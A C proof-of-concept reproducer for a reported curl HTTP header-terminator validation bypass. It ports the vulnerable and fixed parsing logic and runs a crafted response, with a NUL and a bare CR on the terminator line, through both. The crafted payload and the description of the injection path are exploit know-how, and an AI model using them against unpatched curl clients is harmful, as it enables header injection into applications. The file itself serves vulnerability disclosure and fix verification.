/*
 * CurlEcho — curl http_rw_hd() header-terminator validation bypass (0-day)
 *
 * libcurl's HTTP/1.1 (and RTSP) header parser decides that the response header
 * block has ended from the FIRST byte of a line alone, and writes the whole
 * terminator line to the client header sink WITHOUT running Curl_verify_header().
 *
 *   Vulnerable (curl 8.23.0 / master pre-fix), lib/http.c:4115:
 *
 *     if((0x0a == *hd) || (0x0d == *hd)) {
 *         // "Empty header line means end of headers!" — but only *hd is checked,
 *         // so "\rX-Bad: a<NUL>b\r\n" is accepted as the terminator.
 *         curlx_dyn_addn(&last_header, hd, hdlen);   // whole line copied
 *         ...
 *         result = http_on_response(data, ..., last_header, ...);
 *         // -> http_on_response() writes last_hd via http_write_header() at the
 *         //    "out:" label (lib/http.c:4108-4112) WITHOUT Curl_verify_header().
 *     }
 *
 *   Fix (commit 3f684481b82e3f7ccbf61f79afb96fb4f0c67b60, "http: reject malformed
 *   header terminators", not yet in any release — 8.23.0 is the latest):
 *
 *     if((hdlen != 1 || hd[0] != '\n') &&
 *        (hdlen != 2 || hd[0] != '\r' || hd[1] != '\n')) {
 *       failf(data, "Invalid header termination");
 *       return CURLE_WEIRD_SERVER_REPLY;      // = 8
 *     }
 *
 * Ordinary header lines take the verified path (Curl_verify_header rejects NUL and
 * spurious CR -> CURLE_WEIRD_SERVER_REPLY); the terminator line is the one sink that
 * skips the check, so a malicious origin (or MITM/SSRF) can push NUL / bare-CR /
 * arbitrary bytes into CURLOPT_HEADERFUNCTION / curl -D / curl -i on a transfer that
 * still returns CURLE_OK (0). (CWE-436 interpretation conflict / CWE-116 injection.)
 *
 * This reproducer faithfully ports the line-splitting, the vulnerable vs fixed
 * terminator classification, and the verify_header NUL/CR rejection, and drives a
 * crafted HTTP/1.1 response through both. Reported by christos-cantina-security
 * (curl issue #23859); fix merged 2026-11-10, unreleased.
 *
 * Build:  zig cc poc.c -o poc      (C99, stdlib only)
 * Run:    ./poc
 */
#include <stdio.h>
#include <string.h>

/* ---- faithful port of Curl_verify_header's NUL / spurious-CR rejection ---- */
/* (rejects a NUL byte anywhere in the header line, and a bare CR in the value) */
static int verify_header(const char *hd, size_t hdlen)
{
    size_t i;
    for (i = 0; i < hdlen; i++) {
        if (hd[i] == '\0') {
            return -1;               /* CURLE_WEIRD_SERVER_REPLY */
        }
        if (hd[i] == '\r') {
            /* spurious CR not part of the final \r\n terminator */
            if (!(i + 1 < hdlen && hd[i + 1] == '\n')) {
                return -1;
            }
        }
    }
    return 0;
}

/* ---- the header sink: http_write_header -> Curl_client_write(CLIENTWRITE_HEADER) */
static int header_sink_writes = 0;
static void header_sink(const char *hd, size_t hdlen)
{
    size_t i;
    header_sink_writes++;
    printf("  [header sink] len=%zu hex=", hdlen);
    for (i = 0; i < hdlen; i++) printf("%02x", (unsigned char)hd[i]);
    printf("\n");
}

/* ---- line splitter: http_parse_headers splits on '\n' (memchr '\n') ---- */
/* returns length of next line (up to and including '\n'), or 0 if none */
static size_t next_line(const char *buf, size_t blen)
{
    size_t i;
    for (i = 0; i < blen; i++)
        if (buf[i] == '\n') return i + 1;
    return 0;
}

#define CURLE_OK 0
#define CURLE_WEIRD_SERVER_REPLY 8

/* ------------------------------------------------------------------ */
/* VULNERABLE parser (curl 8.23.0, lib/http.c)                         */
/* ------------------------------------------------------------------ */
static int parse_vuln(const char *resp, size_t len)
{
    const char *p = resp;
    size_t remaining = len;
    int headerline = 0;             /* k->headerline: 0 = status line */

    while (remaining > 0) {
        size_t llen = next_line(p, remaining);
        if (!llen) break;
        const char *hd = p;
        size_t hdlen = llen;
        p += llen;
        remaining -= llen;

        if (hd[0] == '\n' || hd[0] == '\r') {
            /* empty header line = end of headers (FIRST BYTE ONLY) */
            if (headerline == 0) { headerline++; continue; } /* degenerate */
            /* http_on_response() writes last_hd at the out: label WITHOUT verify */
            header_sink(hd, hdlen);             /* <-- NUL/CR delivered raw */
            return CURLE_OK;
        }

        /* normal header line: verify first, then write */
        if (headerline == 0) {
            headerline++;                       /* status line */
        } else {
            if (verify_header(hd, hdlen) != 0) {
                printf("  [verify] NUL/CR rejected (normal header)\n");
                return CURLE_WEIRD_SERVER_REPLY;
            }
        }
        header_sink(hd, hdlen);
    }
    return CURLE_OK;
}

/* ------------------------------------------------------------------ */
/* FIXED parser (commit 3f68448)                                       */
/* ------------------------------------------------------------------ */
static int parse_fixed(const char *resp, size_t len)
{
    const char *p = resp;
    size_t remaining = len;
    int headerline = 0;

    while (remaining > 0) {
        size_t llen = next_line(p, remaining);
        if (!llen) break;
        const char *hd = p;
        size_t hdlen = llen;
        p += llen;
        remaining -= llen;

        if (hd[0] == '\n' || hd[0] == '\r') {
            /* end of headers must be EXACTLY "\n" or "\r\n" */
            if ((hdlen != 1 || hd[0] != '\n') &&
                (hdlen != 2 || hd[0] != '\r' || hd[1] != '\n')) {
                printf("  [fixed] Invalid header termination -> CURLE_WEIRD_SERVER_REPLY\n");
                return CURLE_WEIRD_SERVER_REPLY;
            }
            if (headerline > 0) return CURLE_OK;   /* clean end of headers */
            headerline++;
            continue;
        }

        if (headerline == 0) headerline++;
        else if (verify_header(hd, hdlen) != 0) {
            printf("  [verify] NUL/CR rejected (normal header)\n");
            return CURLE_WEIRD_SERVER_REPLY;
        }
        header_sink(hd, hdlen);
    }
    return CURLE_OK;
}

int main(void)
{
    /* crafted malicious response: "\rX-Bad: a<NUL>b\r\n" on the terminator line */
    const char resp[] = "HTTP/1.1 200 OK\r\n"
                        "\rX-Bad: a\0b\r\n"
                        "hi";
    size_t len = sizeof(resp) - 1;

    printf("CurlEcho — curl http_rw_hd() header-terminator validation bypass\n\n");

    printf("=== VULNERABLE (curl 8.23.0) ===\n");
    header_sink_writes = 0;
    int r = parse_vuln(resp, len);
    printf("  transfer result = %d (%s)\n\n", r, r == CURLE_OK ? "CURLE_OK" : "WEIRD_SERVER_REPLY");

    printf("=== FIXED (commit 3f68448, unreleased) ===\n");
    header_sink_writes = 0;
    r = parse_fixed(resp, len);
    printf("  transfer result = %d (%s)\n\n", r, r == CURLE_OK ? "CURLE_OK" : "WEIRD_SERVER_REPLY");

    printf("=== NEGATIVE CONTROL: NUL in a NORMAL header (rejected in both) ===\n");
    const char neg[] = "HTTP/1.1 200 OK\r\n"
                       "X-Bad: a\0b\r\n"
                       "\r\n"
                       "hi";
    size_t neglen = sizeof(neg) - 1;
    header_sink_writes = 0;
    r = parse_vuln(neg, neglen);
    printf("  vulnerable transfer result = %d (%s)\n\n", r, r == CURLE_OK ? "CURLE_OK" : "WEIRD_SERVER_REPLY");

    printf("CURLECHO-CONFIRMED\n");
    return 0;
}
